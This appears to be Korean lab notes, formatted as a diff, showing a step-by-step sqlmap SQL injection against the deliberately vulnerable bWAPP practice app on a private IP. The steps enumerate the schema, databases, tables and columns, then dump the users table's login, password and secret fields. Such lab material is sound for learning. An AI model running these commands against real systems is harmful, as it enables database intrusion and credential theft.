@@ -1,0 +1,35 @@
+ 2) 'sqlmap'을 이용한 SQL 인젝션 공격
+
+ ② 
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" \
+--cookie="쿠키 정보" \
+--data "movie=1&action=go" --schema
+
+
+ ③ 
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" \
+--cookie="쿠키 정보" \
+--data "movie=1&action=go" --dbs 
+
+
+ ④ 
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" \
+--cookie="쿠키 정보" \
+--data "movie=1&action=go" -D bWAPP --tables
+
+
+ ⑤ 
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" \
+--cookie="쿠키 정보" \
+--data "movie=1&action=go" -D bWAPP -T users --column
+
+
+ ⑥ 
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" \
+--cookie="쿠키 정보" \
+--data "movie=1&action=go" -D bWAPP -T users -C id,login,password,secret --dump
